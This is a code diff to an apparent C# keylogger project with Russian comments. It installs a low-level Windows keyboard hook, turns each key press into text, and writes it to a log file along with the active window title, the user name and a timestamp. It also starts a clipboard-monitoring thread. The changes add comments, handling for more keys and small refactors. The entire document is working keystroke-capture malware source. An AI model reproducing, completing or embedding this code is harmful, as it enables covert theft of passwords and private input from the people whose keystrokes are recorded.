@@ -19,27 +19,13 @@ namespace Keylogger
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
-
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
 
         [DllImport("user32.dll")]
         static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
-        // перегрузка для использования с LowLevelKeyboardProc
-        [DllImport("user32.dll")]
-        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] KBDLLHOOKSTRUCT lParam);
-
-        // перегрузка для использования с LowLevelMouseProc
-        [DllImport("user32.dll")]
-        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] MSLLHOOKSTRUCT lParam);
-
-        [DllImport("user32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
+        //MarshalAs переопределяет тип возвращаемого значения по умолчанию
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool PeekMessage(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);
@@ -1150,37 +1136,45 @@ namespace Keylogger
             HSHELL_WINDOWREPLACED = 13
         }
 
+        //Reference https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.keys?view=windowsdesktop-7.0
+        //Вся информация о кнопках Keys типа enum взята по ссылке сверху
         private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
         {
             Int32 msgType = wParam.ToInt32();
             Int32 vKey;
             string key = "";
+
             if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
             {
                 bool shift = false;
+
                 IntPtr hWindow = GetForegroundWindow();
                 short shiftState = GetAsyncKeyState(Keys.ShiftKey);
+
                 if ((shiftState & 0x8000) == 0x8000)
                 {
                     shift = true;
                 }
+
                 var caps = Console.CapsLock;
 
                 // считывание виртуального ключа из буфера
                 vKey = Marshal.ReadInt32(lParam);
 
                 // Разбор ключа
+                //Проверка на применение shift и caps для кнопок, которые позволяют это сделать
                 if (vKey > 64 && vKey < 91)
                 {
                     if (shift | caps)
                     {
-                        key = ((Keys)vKey).ToString();
+                        key = ((Keys)vKey).ToString().ToUpper();
                     }
                     else
                     {
                         key = ((Keys)vKey).ToString().ToLower();
                     }
                 }
+                //numpad 
                 else if (vKey >= 96 && vKey <= 111)
                 {
                     switch (vKey)
@@ -1235,6 +1229,7 @@ namespace Keylogger
                             break;
                     }
                 }
+                //Символы, которые можно использовать только с зажатым шифтом
                 else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                 {
                     if (shift)
@@ -1416,8 +1411,20 @@ namespace Keylogger
                         case Keys.F12:
                             key = "<F12>";
                             break;
+                        case Keys.PrintScreen:
+                            key = "<PrintScreen>";
+                            break;
+                        case Keys.Scroll:
+                            key = "<ScrollLock>";
+                            break;
+                        case Keys.Pause:
+                            key = "<Pause>";
+                            break;
                         case Keys.Insert:
                             key = "<Insert>";
+                            break;
+                        case Keys.Home:
+                            key = "<Home>";
                             break;
                         case Keys.Delete:
                             key = "<Delete>";
@@ -1458,6 +1465,12 @@ namespace Keylogger
                         case Keys.RWin:
                             key = "<Windows Key>";
                             break;
+                        case Keys.LShiftKey:
+                            key = "<Shift Key>";
+                            break;
+                        case Keys.RShiftKey:
+                            key = "<Shift Key>";
+                            break;
                         case Keys.LControlKey:
                             key = "<Ctrl>";
                             break;
@@ -1472,27 +1485,28 @@ namespace Keylogger
 
                 Dictionary<string, string> props = new Dictionary<string, string>();
                 props["Key"] = key;
-                props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
+                props["Time"] = DateTime.Now.ToString();
                 props["Window"] = title.ToString();
-                if (props["Window"] != Program.lastTitle)
+                //Если активное окно, с которым пользователь работает, не изменилось на другое
+                if (props["Window"] != lastTitle)
                 {
-                    string titleString =    "User    : " + Program.userName + Environment.NewLine +
+                    string titleString = "User    : " + userName + Environment.NewLine +
                                             "Window  : " + props["Window"] + Environment.NewLine +
                                             "Time    : " + props["Time"] + Environment.NewLine +
-                                            "LogFile : " + Program.logName + Environment.NewLine;
+                                            "LogFile : " + logName + Environment.NewLine;
                     Trace.WriteLine("");
                     Trace.WriteLine("");
                     Trace.WriteLine(titleString);
                     Trace.WriteLine("");
                     // Запись в файл
-                    Program.lastTitle = props["Window"];
+                    lastTitle = props["Window"];
                 }
                 Trace.Write(props["Key"]);
                 // записываем в файл здесь
             }
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
-
+        //Запускает окно приложения
         private static void BootClipboard()
         {
             Application.Run(new ClipboardNotification.NotificationForm());
@@ -1503,7 +1517,7 @@ namespace Keylogger
             try
             {
                 Trace.Listeners.Clear();
-                TextWriterTraceListener twtl = new TextWriterTraceListener(Program.logName);
+                TextWriterTraceListener twtl = new TextWriterTraceListener(logName);
                 twtl.Name = "TextLogger";
                 twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
 
@@ -1513,7 +1527,6 @@ namespace Keylogger
                 Trace.Listeners.Add(twtl);
                 Trace.Listeners.Add(ctl);
                 Trace.AutoFlush = true;
-
 
                 // Запустить буфер обмена
                 ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
@@ -1527,7 +1540,7 @@ namespace Keylogger
                 while (true)
                 {
                     PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                    System.Threading.Thread.Sleep(5);
+                    Thread.Sleep(5);
                 }
             }
             catch (Exception ex)
